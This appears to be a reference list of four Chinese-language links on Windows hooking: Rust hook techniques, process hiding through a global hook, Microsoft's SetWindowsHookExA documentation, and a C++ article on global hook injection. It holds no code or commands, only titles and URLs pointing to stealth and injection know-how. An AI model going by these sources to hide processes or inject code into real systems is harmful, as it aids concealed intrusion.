[Rust编写几种hook的方式 | mi1itray.axe · github.io](https://military-axe.github.io/posts/rustbian-xie-ji-chong-hookde-fang-shi/)

[Window向之全局Hook实现进程隐藏 | xq17 · 先知](https://xz.aliyun.com/t/10256?time__1311=mq%2BxBDyDRAn4lxGggYG8i2A1DjhnPoD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F)

[SetWindowsHookExA 函数 (winuser.h)](https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowshookexa)

[【C++】代码实现：全局钩子注入技术 | kingkee · csdn.net](https://blog.csdn.net/kingkee/article/details/97390029)